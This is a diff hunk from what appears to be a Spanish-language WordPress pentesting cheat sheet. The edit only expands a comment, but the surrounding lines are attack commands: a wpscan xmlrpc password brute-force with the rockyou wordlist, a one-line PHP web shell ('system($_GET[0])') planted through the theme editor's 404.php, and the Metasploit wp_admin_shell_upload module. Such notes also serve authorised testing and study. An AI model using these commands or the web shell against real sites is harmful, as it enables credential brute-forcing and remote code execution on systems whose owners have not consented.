@@ -48,7 +48,7 @@ wp-config.php
 sudo wpscan --password-attack xmlrpc -t 20 -U <usuario> -P /usr/share/wordlists/rockyou.txt --url http://<url>
 #Bruteforce con wpscan
 system($_GET[0]);
-#Con acceso administrativo podemos modificar el codigo PHP para ejecutar comandos
+#Con acceso administrativo podemos modificar el codigo PHP para ejecutar comandos en wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
 use exploit/unix/webapp/wp_admin_shell_upload 
 #Modulo de Metasploit que permite subir una web shell y ejecutarla automaticamente mediante un usuario y contraseña de admin
 
